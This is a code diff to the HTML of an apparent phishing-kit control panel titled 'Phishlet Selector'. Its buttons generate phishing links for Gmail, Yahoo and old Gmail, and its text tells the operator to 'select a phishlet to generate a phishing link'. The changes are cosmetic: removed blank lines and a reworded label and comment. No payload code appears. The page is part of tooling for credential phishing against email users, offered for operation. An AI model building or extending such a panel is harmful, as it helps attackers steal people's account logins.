@@ -5,11 +5,9 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Dashboard 2 | Phishlet Selector</title>
   <link rel="stylesheet" href="styles.css" />
-
   <!-- Firebase SDKs -->
   <script defer src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
   <script defer src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
-
   <!-- Load custom scripts -->
   <script defer src="firebase-config.js"></script>
   <script defer src="script.js"></script>
@@ -21,20 +19,17 @@
     <button class="menu-btn animated" onclick="generatePhishletLink('gmail')">Gmail</button>
     <button class="menu-btn animated" onclick="generatePhishletLink('yahoo')">Yahoo</button>
     <button class="menu-btn animated" onclick="generatePhishletLink('gmail-old')">Gmail (Old)</button>
-
     <!-- Back button for navigation -->
     <button class="menu-btn animated" onclick="window.location.href='dashboard.html'">
-      🔙 Back to Generate Links
+      🔙 Back to Dashboard
     </button>
   </div>
   
   <div class="content">
     <h2>Phishlet Selector</h2>
     <p>Select a phishlet to generate a phishing link.</p>
-
-    <!-- Output for generated phishing links -->
+    <!-- Output for generated phishing link -->
     <div id="phishletLink" class="generated-link-output"></div>
   </div>
 </body>
 </html>
-
